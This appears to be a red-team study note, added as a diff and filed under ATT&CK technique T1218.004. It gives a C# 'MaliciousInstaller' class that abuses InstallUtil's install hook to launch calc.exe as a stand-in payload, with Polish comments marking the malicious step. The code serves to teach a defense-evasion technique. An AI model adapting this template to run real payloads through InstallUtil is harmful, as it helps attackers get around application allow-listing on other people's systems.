@@ -1,0 +1,40 @@
+---
+title: "InstallUtil DLL"
+folder: "07. Defense Evasion/T1218 System Binary Proxy Execution/.004 InstallUtil"
+---
+
+
+
+using System;
+using System.ComponentModel;
+using System.Configuration.Install;
+using System.Diagnostics;
+
+namespace MaliciousLibrary
+{
+    [RunInstaller(true)]
+    public class MaliciousInstaller : Installer
+    {
+        public override void Install(System.Collections.IDictionary stateSaver)
+        {
+            // Złośliwe działanie podczas instalacji
+            try
+            {
+                Process.Start("C:\\Windows\\System32\\calc.exe");
+            }
+            catch (Exception ex)
+            {
+                // Obsługa wyjątków
+                Console.WriteLine("Wystąpił błąd podczas uruchamiania calc.exe: " + ex.Message);
+            }
+
+            base.Install(stateSaver);
+        }
+
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            // Złośliwe działanie podczas deinstalacji (opcjonalne)
+            base.Uninstall(savedState);
+        }
+    }
+}
